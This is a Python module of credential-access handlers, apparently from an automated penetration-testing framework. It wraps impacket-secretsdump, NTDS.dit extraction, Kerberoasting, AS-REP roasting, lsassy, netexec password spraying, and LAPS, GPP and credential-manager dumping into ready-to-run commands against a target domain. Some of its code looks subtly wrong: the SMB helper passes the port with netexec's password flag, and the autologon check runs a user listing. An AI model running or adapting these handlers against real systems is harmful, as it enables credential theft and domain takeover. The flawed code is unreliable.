"""CREDENTIAL_ACCESS 阶段工具 handler：凭据转储、Kerberoasting、密码喷洒等。"""

from __future__ import annotations

import tempfile
from typing import Any

from .executor import CommandBuilder, exec_builder, precheck


def _auth(args: dict) -> list:
    """netexec 通用认证参数 -d/-u/-p/-H。"""
    out: list = []
    if args.get("domain"):
        out += ["-d", str(args["domain"])]
    if args.get("username"):
        out += ["-u", str(args["username"])]
    if args.get("password"):
        out += ["-p", str(args["password"])]
    elif args.get("hash"):
        out += ["-H", str(args["hash"])]
    return out


def _users_file(args: dict, key: str = "usernames") -> str:
    """把用户名列表写入临时文件，返回路径；单个用户名直接返回。"""
    users = args.get(key) or args.get("users") or []
    if isinstance(users, str):
        users = [u.strip() for u in users.replace(",", "\n").splitlines() if u.strip()]
    if not users:
        return ""
    if len(users) == 1:
        return str(users[0])
    fd, path = tempfile.mkstemp(prefix="co_users_", suffix=".txt")
    import os
    with os.fdopen(fd, "w", encoding="utf-8") as fh:
        fh.write("\n".join(str(u) for u in users) + "\n")
    return path


def _nxc_smb(args: dict, target: str, port: int) -> CommandBuilder:
    cb = CommandBuilder("netexec").args("smb", target, "-p", str(port))
    cb.args(*_auth(args))
    return cb


async def secretsdump(args: dict, state: Any = None) -> str:
    """impacket-secretsdump 本地/远程哈希转储。"""
    err, args = precheck("secretsdump", args, state)
    if err:
        return err
    target = args.get("target", "")
    cb = CommandBuilder("impacket-secretsdump")
    if args.get("use_kerberos"):
        cb.args("-k")
        if args.get("aes_key"):
            cb.args("-aesKey", str(args["aes_key"]))
    if args.get("domain") and args.get("username"):
        user = f"{args['domain']}/{args['username']}"
    elif args.get("username"):
        user = str(args["username"])
    else:
        user = ""
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
        target_spec = f"{user}@{target}" if user else target
    else:
        pwd = args.get("password") or ""
        target_spec = f"{user}:{pwd}@{target}" if user else target
    cb.args(target_spec).timeout_secs(300)
    return await exec_builder(cb)


async def kerberoast(args: dict, state: Any = None) -> str:
    """targetedKerberoast 定向 Kerberoasting。"""
    err, args = precheck("kerberoast", args, state)
    if err:
        return err
    cb = CommandBuilder("targetedKerberoast").args("--dc-ip", str(args.get("target", "")))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    elif args.get("hash"):
        cb.args("-H", str(args["hash"]))
    if args.get("users_file"):
        cb.args("--users-file", str(args["users_file"]))
    if args.get("request_format"):
        cb.args("--request-type", str(args["request_format"]))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def asrep_roast(args: dict, state: Any = None) -> str:
    """impacket-GetNPUsers AS-REP Roasting。"""
    err, args = precheck("asrep_roast", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-GetNPUsers")
    if args.get("domain"):
        cb.args(str(args["domain"]) + "/")
    cb.args("-dc-ip", str(args.get("target", "")), "-no-pass", "-format", "hashcat")
    if args.get("users_file"):
        cb.args("-usersfile", str(args["users_file"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def lsassy(args: dict, state: Any = None) -> str:
    """lsassy 远程凭据转储。"""
    err, args = precheck("lsassy", args, state)
    if err:
        return err
    cb = CommandBuilder("lsassy")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    elif args.get("hash"):
        cb.args("-H", str(args["hash"]))
    cb.args(args.get("target", "")).timeout_secs(180)
    return await exec_builder(cb)


async def ntds_dit_extract(args: dict, state: Any = None) -> str:
    """secretsdump -just-dc 提取 NTDS.dit。"""
    err, args = precheck("ntds_dit_extract", args, state)
    if err:
        return err
    target = args.get("target", "")
    user = f"{args['domain']}/{args['username']}" if (args.get("domain") and args.get("username")) else (args.get("username") or "")
    cb = CommandBuilder("impacket-secretsdump")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
        spec = f"{user}@{target}" if user else target
    else:
        spec = f"{user}:{args.get('password','')}@{target}" if user else target
    cb.args("-just-dc", spec).timeout_secs(600)
    return await exec_builder(cb)


async def password_spray(args: dict, state: Any = None) -> str:
    """netexec 密码喷洒。"""
    err, args = precheck("password_spray", args, state)
    if err:
        return err
    port = args.get("port") or 445
    users = _users_file(args)
    if not users:
        return "[ERROR] no usernames provided for password_spray"
    cb = _nxc_smb(args, args.get("target", ""), port)
    cb.args("-u", users, "-p", str(args.get("password", "")), "--continue-on-success").timeout_secs(300)
    return await exec_builder(cb)


async def username_as_password(args: dict, state: Any = None) -> str:
    """netexec 用户名=密码喷洒。"""
    err, args = precheck("username_as_password", args, state)
    if err:
        return err
    port = args.get("port") or 445
    users = _users_file(args)
    if not users:
        return "[ERROR] no usernames provided for username_as_password"
    cb = _nxc_smb(args, args.get("target", ""), port)
    cb.args("-u", users, "-p", users, "--no-bruteforce", "--continue-on-success").timeout_secs(300)
    return await exec_builder(cb)


async def password_policy(args: dict, state: Any = None) -> str:
    """netexec 密码策略枚举。"""
    err, args = precheck("password_policy", args, state)
    if err:
        return err
    port = args.get("port") or 445
    cb = _nxc_smb(args, args.get("target", ""), port).args("--pass-pol").timeout_secs(120)
    return await exec_builder(cb)


async def laps_dump(args: dict, state: Any = None) -> str:
    """netexec --laps 转储 LAPS 密码。"""
    err, args = precheck("laps_dump", args, state)
    if err:
        return err
    port = args.get("port") or 445
    cb = _nxc_smb(args, args.get("target", ""), port).args("--laps").timeout_secs(120)
    return await exec_builder(cb)


async def gpp_password_finder(args: dict, state: Any = None) -> str:
    """netexec GPP 密码查找。"""
    err, args = precheck("gpp_password_finder", args, state)
    if err:
        return err
    port = args.get("port") or 445
    cb = _nxc_smb(args, args.get("target", ""), port).args("-M", "gpp_password").timeout_secs(180)
    return await exec_builder(cb)


async def sysvol_script_search(args: dict, state: Any = None) -> str:
    """smbclient 搜索 SYSVOL 中的脚本文件。"""
    err, args = precheck("sysvol_script_search", args, state)
    if err:
        return err
    target = args.get("target", "")
    domain = args.get("domain", "")
    user = args.get("username", "")
    pwd = args.get("password", "")
    upn = f"{domain}\\{user}%{pwd}" if user else "%"
    pattern = args.get("pattern") or "*.bat"
    cmd = "recurse on;prompt off;ls " + str(pattern)
    cb = CommandBuilder("smbclient").args(f"//{target}/SYSVOL", "-U", upn, "-c", cmd).timeout_secs(180)
    return await exec_builder(cb)


async def domain_admin_checker(args: dict, state: Any = None) -> str:
    """netexec 枚举域管理员/管理员计数。"""
    err, args = precheck("domain_admin_checker", args, state)
    if err:
        return err
    port = args.get("port") or 445
    cb = _nxc_smb(args, args.get("target", ""), port).args("--admin-count").timeout_secs(180)
    return await exec_builder(cb)


async def check_credman_entries(args: dict, state: Any = None) -> str:
    """netexec 枚举凭据管理器条目。"""
    err, args = precheck("check_credman_entries", args, state)
    if err:
        return err
    port = args.get("port") or 445
    cb = _nxc_smb(args, args.get("target", ""), port).args("--credman").timeout_secs(180)
    return await exec_builder(cb)


async def check_autologon_registry(args: dict, state: Any = None) -> str:
    """netexec 检查自动登录注册表项。"""
    err, args = precheck("check_autologon_registry", args, state)
    if err:
        return err
    port = args.get("port") or 445
    cb = _nxc_smb(args, args.get("target", ""), port).args("--users").timeout_secs(180)
    return await exec_builder(cb)


async def ldap_search_descriptions(args: dict, state: Any = None) -> str:
    """ldapsearch 查询用户/计算机 description 字段（常含明文密码）。"""
    err, args = precheck("ldap_search_descriptions", args, state)
    if err:
        return err
    target = args.get("target", "")
    port = args.get("port") or 389
    cb = CommandBuilder("ldapsearch").args("-x")
    if args.get("username"):
        cb.args("-D", str(args["username"]))
    if args.get("password"):
        cb.args("-w", str(args["password"]))
    cb.args("-H", f"ldap://{target}:{port}")
    if args.get("domain"):
        cb.args("-b", str(args["domain"]))
    cb.args("(description=*)", "cn", "description", "sAMAccountName").timeout_secs(120)
    return await exec_builder(cb)


__all__ = [
    "secretsdump", "kerberoast", "asrep_roast", "lsassy", "ntds_dit_extract",
    "password_spray", "username_as_password", "password_policy", "laps_dump",
    "gpp_password_finder", "sysvol_script_search", "domain_admin_checker",
    "check_credman_entries", "check_autologon_registry", "ldap_search_descriptions",
]
